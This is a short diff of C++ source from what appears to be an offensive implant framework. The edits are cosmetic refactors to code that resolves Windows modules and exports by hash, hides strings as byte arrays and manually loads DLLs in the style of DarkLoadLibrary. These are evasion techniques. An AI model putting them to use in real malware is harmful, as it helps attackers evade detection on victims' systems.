@@ -5,8 +5,7 @@ using namespace Opsec;
 using namespace Utils;
 using namespace Memory::Methods;
 
-typedef BOOL(WINAPI * DLLMAIN)(HINSTANCE, DWORD, LPVOID);
-
+typedef BOOL(WINAPI *DLLMAIN)(HINSTANCE, DWORD, LPVOID);
 __attribute__((used, section(".rdata"))) uint8_t dot_dll[] = { 0x2a,0x00,0x2e,0x00,0x64,0x00,0x6c,0x00,0x6c,0x00,0x00 };
 __attribute__((used, section(".rdata"))) uint8_t sys32[] = {
 	0x43,0x00,0x3a,0x00,0x2f,0x00,0x57,0x00,0x69,0x00,0x6e,0x00,0x64,0x00,0x6f,0x00,
@@ -41,7 +40,7 @@ namespace Modules {
 		return sec_address;
 	}
 
-    PLDR_DATA_TABLE_ENTRY FindModuleEntry(const uint32 hash) {
+    PLDR_DATA_TABLE_ENTRY FindModuleEntry(CONST UINT32 hash) {
         CONST LIST_ENTRY *head = &(PEB_POINTER)->Ldr->InMemoryOrderModuleList;
 
         for (auto next = head->Flink; next != head; next = next->Flink) {
@@ -58,7 +57,7 @@ namespace Modules {
         return nullptr;
     }
 
-    FARPROC FindExportAddress(const VOID *base, const UINT32 hash) {
+    FARPROC FindExportAddress(CONST VOID *base, CONST UINT32 hash) {
         FARPROC address = nullptr;
 
         CONST PIMAGE_NT_HEADERS nt_head = RVA(PIMAGE_NT_HEADERS, base, ((PIMAGE_DOS_HEADER) base)->e_lfanew);
@@ -848,7 +847,7 @@ namespace Modules {
         HEXANE;
 
         // Code based off of https://github.com/bats3c/DarkLoadLibrary
-        PEXECUTABLE mod = (PEXECUTABLE)ctx->win32.RtlAllocateHeap(ctx->heap, HEAP_ZERO_MEMORY, sizeof(EXECUTABLE));
+        PEXECUTABLE mod = (PEXECUTABLE)Malloc(sizeof(EXECUTABLE));
         if (!mod) {
             return nullptr;
         }
